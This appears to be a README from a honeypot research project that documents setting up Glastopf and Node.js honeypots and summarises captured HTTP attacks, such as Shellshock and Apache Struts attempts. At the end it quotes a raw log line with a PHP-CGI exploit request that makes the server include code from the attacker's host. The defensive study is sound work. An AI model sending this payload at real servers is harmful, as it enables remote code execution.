# HTTP Analysis of traffic, URIs, User-Agents & exploits
## Summary
This section of the repository deals with our explorations into the HTTP protocol, and deals with websites that have an HTTP server running on them.

There were several steps involved in this exploration. First, we setup a Glastopf honeypot in a Docker container, and captured for 24 hour period around March 7th, 2017. Next, we added honeypot functionality to an existing service based on Nodejs, which proved to have more traffic going to it, and more real drive-by exploits happening to it. From this webservice, we captured two binaries from drive by exploits, one attempting to exploit a shellshock vulnerability (PerlBot Trojan), and the other attempting to exploit an apache struts vulnerability(Bitcoin Miner Trojan).

While continuing to develop the Nodejs server, we setup the Glastopf honeypot to run for an additional 12 days to capture any new and interesting URI requests or POST data requests.

The data from the two running honeypots on different servers gave us a list of popularly requested resources, and user agents. In total, the most common resource requested was different permutations of ``phpmyadmin/scripts/setup.php``. With this data, I set about researching the rest of the resources requested, assuming that they are targeting resources to exploit. The intention in this is to copy the resources (such as ``scripts/setup.php``) into the Nodejs server, and use that to attract more malware traffic.

To research these resources, I googled the resources that stuck out in the logs, things that weren't phpmyadmin or struts vulnerabilities. I discovered a bunch of publicly accessible ``awstats`` logs dating from 2014-2017, with many more URI requests than our honeypots could gather. I followed some of these URI requests and found two more PerlBot Trojans, from analyzing one portion of one of the logs. The other public logs came from distributed parts of the globe: Canada, USA, Bangalore, Italy, Germany, Australia, Portugal, India, Austria, Indonesia, etc. Most of these logs look fairly similar, with many requests from PhpMyAdmin, Apache Struts, Joomla, and Vunerable Wordpress plugins, which is interesting because these are similar resources being accessed all across the world.

Currently, I am incorporating several key resources into the Nodejs honeypot, and cleaning up the code (initially it was very hastily put together).

## Process
### Analyze Traffic from port 80 while a Glastopf honeypot is set up
The steps detailed above occurred between March 6, 2017 at 18:45PST and March 7, 2017 at 18:30PST

#### Getting the Data: 
0. Install docker: ``sudo apt-get install docker docker.io``
1. clone the glastopf honeypot git repository: ``git clone https://github.com/mushorg/glastopf && cd glastopf`` [glastopf](https://github.com/mushorg/glastopf.git)
2. Build Glastopf's Docker image: ``sudo docker build --tag glastopf .``
3. Make a new directory for the glastopf logs: ``mkdir myhoneypot1``
4. Run the docker image: ``sudo docker run --detach --publish 80:80 --volume myhoneypot1:/opt/myhoneypot glastopf``
5. Create a log file for tshark for the root user: ``sudo touch http_log.pcap``
6. Start Tshark logging in the background: ``sudo tshark -w http_log.pcap "port 80 or port 8080 or port 443" &``
7. After capturing for 24 hours, stop capturing: ``sudo docker stop <container id>; sudo pkill tshark``
8. Read the pcap: ``tshark -r ~/http_log.pcap``
9. Read glastopf's logs: ``less ~/glastopf/myhoneypot1/logs/glastopf.log``
10. Copy all logs into the same place: ``mkdir http_glastopf_logs && cp http_log.pcap http_glastopf_logs; cp -r ~/glastopf/myhoneypot1/logs/ http_glastopf_logs/``
11. Compress this directory into a tarball: ``tar -vacf http_glastopf_logs.tar.gz http_glastopf_logs/``
12. Exit out of server
13. Copy the tarball from server to a local machine and add it to the github repository. ``scp -P <port> <usr name>@<ip addr of server>:~/http_glastopf_logs.tar.gz /home/$(whoami)/``

#### Helpful Links for prefab honeypots
* [glastopf](https://github.com/mushorg/glastopf.git)



## Specific Data about blatant drive-by exploits against our servers
### Drive By Exploit attempts:
1. Apache Struts
2. Shellshock
3. PHP/CGI-bin exploit
	2017-03-26 03:24:29,428 (glastopf.glastopf) 191.96.249.97 requested GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n on 13dc3d8ebca9:80
  * When Downloaded, the file ok.txt contains the text: ``echo "nigerianwarrior";``
